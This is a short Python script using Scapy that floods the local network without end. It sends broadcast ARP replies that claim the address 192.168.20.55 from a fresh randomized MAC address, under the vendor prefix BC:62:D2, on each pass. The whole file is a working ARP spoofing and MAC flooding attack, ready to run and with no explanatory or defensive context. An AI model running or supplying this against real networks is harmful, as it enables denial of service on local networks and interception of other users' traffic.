#!/usr/bin/env python
from scapy.all import *

vendor = "BC:62:D2:"
destMAC = "FF:FF:FF:FF:FF:FF"

while 1:
	randMAC=vendor
	randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
	print(randMAC)
	sendp(Ether(src=randMAC ,dst=destMAC)/ARP(op=2, psrc="192.168.20.55", hwdst=destMAC)/Padding(load="X"*18),verbose=0)
